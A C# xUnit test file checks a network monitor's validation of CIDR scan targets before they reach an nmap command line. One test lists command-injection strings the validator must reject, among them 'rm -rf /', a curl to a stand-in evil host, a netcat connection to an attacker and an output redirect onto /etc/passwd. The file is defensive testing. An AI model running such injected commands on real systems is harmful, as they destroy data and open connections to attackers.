using FluentAssertions;
using NetworkMonitor.Server.Helpers;
using Xunit;

namespace NetworkMonitor.Tests.Tests;

/// <summary>
/// Validation tests for scan targets. This is the security boundary of the whole
/// application: every string that reaches the nmap command line passes through
/// <see cref="CidrUtil.ValidateForCommand"/> first, so the injection cases below
/// matter more than the happy path.
/// </summary>
public class CidrUtilTests
{
    [Theory]
    [InlineData("203.0.113.0/24")]
    [InlineData("198.51.100.0/25")]
    [InlineData("10.0.0.0/8")]
    [InlineData("192.168.1.1")]
    [InlineData("172.16.5.0/16")]
    [InlineData("0.0.0.0/0")]
    [InlineData("255.255.255.255/32")]
    public void ValidateForCommand_accepts_well_formed_targets(string cidr)
    {
        var act = () => CidrUtil.ValidateForCommand(cidr);
        act.Should().NotThrow();
    }

    /// <summary>
    /// Each of these smuggles a second command, an extra argument, or a file
    /// redirect past a naive implementation. The shape check must reject them
    /// all before any of it can reach a process start.
    /// </summary>
    [Theory]
    [InlineData("203.0.113.0/24; rm -rf /")]
    [InlineData("203.0.113.0/24 && curl evil.example.com")]
    [InlineData("203.0.113.0/24 | nc attacker 4444")]
    [InlineData("$(whoami)")]
    [InlineData("`id`")]
    [InlineData("203.0.113.0/24 -oN /etc/passwd")]
    [InlineData("203.0.113.0/24\nnmap other")]
    [InlineData("--script=http-vuln")]
    [InlineData("example.com")]
    [InlineData("2001:db8::/32")]
    public void ValidateForCommand_rejects_injection_and_non_ipv4(string cidr)
    {
        var act = () => CidrUtil.ValidateForCommand(cidr);
        act.Should().Throw<ArgumentException>();
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void ValidateForCommand_rejects_empty(string? cidr)
    {
        var act = () => CidrUtil.ValidateForCommand(cidr!);
        act.Should().Throw<ArgumentException>();
    }

    [Theory]
    [InlineData("203.0.113.0/33")]
    [InlineData("203.0.113.0/99")]
    [InlineData("999.0.113.0/24")]
    [InlineData("203.0.113.256")]
    public void ValidateForCommand_rejects_out_of_range_values(string cidr)
    {
        var act = () => CidrUtil.ValidateForCommand(cidr);
        act.Should().Throw<ArgumentException>();
    }

    [Theory]
    [InlineData("203.0.113.0/24", 256)]
    [InlineData("203.0.113.0/25", 128)]
    [InlineData("10.0.0.0/8", 16777216)]
    [InlineData("203.0.113.5/32", 1)]
    public void AddressCount_sizes_the_target(string cidr, long expected)
    {
        CidrUtil.AddressCount(cidr).Should().Be(expected);
    }

    [Theory]
    [InlineData("203.0.113.0/24", "203.0.113.55", true)]
    [InlineData("203.0.113.0/24", "203.0.114.55", false)]
    [InlineData("10.0.0.0/8", "10.20.30.40", true)]
    [InlineData("192.168.1.0/28", "192.168.1.20", false)]
    [InlineData("192.168.1.0/28", "192.168.1.14", true)]
    public void Contains_tests_membership(string cidr, string ip, bool expected)
    {
        CidrUtil.Contains(cidr, ip).Should().Be(expected);
    }
}
